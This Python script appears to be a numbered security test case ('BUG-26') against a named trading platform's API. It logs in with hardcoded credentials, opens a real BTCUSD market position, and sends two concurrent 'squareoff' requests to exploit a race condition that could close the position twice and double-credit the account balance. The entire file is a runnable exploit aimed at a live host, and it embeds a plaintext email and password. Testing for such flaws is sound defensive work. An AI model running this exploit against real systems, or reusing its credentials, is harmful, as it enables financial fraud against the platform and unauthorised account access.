"""
BUG-26: Concurrent Squareoff from Two Sessions (Same Position) → Double-Close
Attack: Open position, then fire squareoff from two simultaneous sessions.
        If both succeed, the position may be closed twice (reversed or double-credit).
"""
import requests, concurrent.futures, json, time

BASE_URL = "https://lpadmin.blackfx.com"

def make_session(email, password):
    s = requests.Session()
    s.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
    t = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
    return s, {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}

s_m1, h_m1 = make_session("mamm@mailinator.com", "12345678")
s_m2, h_m2 = make_session("mamm@mailinator.com", "12345678")

# Record pre-test balance
pre = s_m1.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m1).json()
pre_balance = pre.get("funds", {}).get("balance")
print(f"Pre-test balance: {pre_balance}")

# Open position
order = s_m1.post(f"{BASE_URL}/v1/oms/real/orders", headers=h_m1, json={
    "symbol": "BTCUSD", "side": "BUY", "quantity": 0.001, "type": "MARKET"
})
print(f"Open order: {order.status_code} {order.text[:200]}")
time.sleep(2)

# Get position
pos_data = s_m1.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m1).json()
positions = pos_data.get("positions", [])
if not positions:
    print("No position found. Abort.")
    exit(1)

mid = positions[0].get("market_order_id") or positions[0].get("id")
print(f"Position ID: {mid}")

results = {}

def squareoff(session, headers, position_id, label):
    r = session.post(
        f"{BASE_URL}/v1/oms/real/positions/{position_id}/squareoff",
        headers=headers
    )
    results[label] = {"status": r.status_code, "body": r.text[:400]}
    print(f"[{label}] Squareoff: {r.status_code} {r.text[:200]}")
    return r.status_code

with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
    f1 = ex.submit(squareoff, s_m1, h_m1, mid, "SESSION_A")
    f2 = ex.submit(squareoff, s_m2, h_m2, mid, "SESSION_B")
    r1 = f1.result()
    r2 = f2.result()

time.sleep(2)
post = s_m1.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m1).json()
post_balance = post.get("funds", {}).get("balance")
print(f"\nPost-test balance: {post_balance}")
print(f"Post positions: {len(post.get('positions', []))}")

print("\n=== RESULTS ===")
print(json.dumps(results, indent=2))

if r1 == 200 and r2 == 200:
    print("\n🚨 BUG-26 CONFIRMED: Both squareoff requests returned HTTP 200!")
    print(f"   Balance delta: {post_balance - pre_balance} (should be ~0 or small profit/loss)")
    if post_balance and post_balance > pre_balance * 1.001:
        print("   🚨 DOUBLE CREDIT detected: balance increased beyond expected!")
else:
    print(f"\n✅ BUG-26 NOT confirmed: responses = {r1}, {r2}")

print("\nBUG-26 test complete.")
